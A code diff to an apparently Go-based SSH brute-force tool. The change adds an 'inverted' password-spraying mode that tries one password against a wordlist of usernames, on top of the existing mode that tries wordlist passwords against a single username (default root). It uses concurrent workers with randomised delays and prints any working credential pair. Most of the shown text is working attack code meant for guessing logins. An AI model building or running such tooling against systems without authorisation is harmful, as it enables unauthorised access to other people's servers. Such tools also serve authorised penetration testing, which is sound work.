@@ -35,18 +35,24 @@ func sshlogin(addr string, username string, password string, timeout int64) bool
 	return true
 }
 
-func runWordlistPart(addr string, list []string, username string, timeout int64) {
+func runWordlistPart(addr string, list []string, username string, timeout int64, inverted bool) {
 	time.Sleep(time.Duration(rand.Float64() * float64(time.Second)))
-	for _, password := range list {
+	for _, wordlistline := range list {
 		time.Sleep(time.Duration(rand.Float64() * float64(time.Second) / 2))
 		if operationDone {
 			break
 		}
-		if sshlogin(addr, username, password, timeout) {
+		usr := username
+		pwd := wordlistline
+		if inverted {
+			usr = wordlistline
+			pwd = username // Not the best naming I know :D
+		}
+		if sshlogin(addr, usr, pwd, timeout) {
 			fmt.Println("================================")
 			fmt.Println(" Found working combo")
-			fmt.Println(" Username: " + username)
-			fmt.Println(" Password: " + password)
+			fmt.Println(" Username: " + usr)
+			fmt.Println(" Password: " + pwd)
 			fmt.Println("================================")
 			sem <- struct{}{}
 			operationDone = true
@@ -97,13 +103,15 @@ func main() {
 	wordlistPath := "./smalllist.txt"
 	workerCount := 10
 	timeout := 3
+	inverted := false
 
 	rand.Seed(time.Now().UnixNano())
 	flag.StringVar(&addr, "h", "127.0.0.1", "Specify Hostname or ip. Default is 127.0.0.1")
 	flag.IntVar(&port, "p", 22, "Specify Port. Default is 22")
-	flag.StringVar(&username, "u", "root", "Specify username. Default is root")
+	flag.StringVar(&username, "u", "root", "Specify username or password (depends on inverted flag). Default is root")
 	flag.IntVar(&workerCount, "c", 22, "Specify Worker count. Default is 10")
 	flag.IntVar(&timeout, "t", 3, "Specify Timeout. Default is 3")
+	flag.BoolVar(&inverted, "i", false, "Specify Inversion mode, bruteforce username with one password. Default is false")
 	flag.StringVar(&wordlistPath, "w", "./smalllist.txt", "Specify wordlist. Default is ./smalllist.txt")
 	flag.Usage = func() {
 		flag.PrintDefaults() // prints default usage
@@ -136,7 +144,7 @@ func main() {
 	wg.Add(workerCount)
 	fmt.Println(" Start " + strconv.Itoa(workerCount) + " wordlist workers...")
 	for _, wordlist := range wordlists {
-		go runWordlistPart(target, wordlist, username, int64(timeout))
+		go runWordlistPart(target, wordlist, username, int64(timeout), inverted)
 	}
 	fmt.Println(" Started you can now get some coffee")
 	now := time.Now()
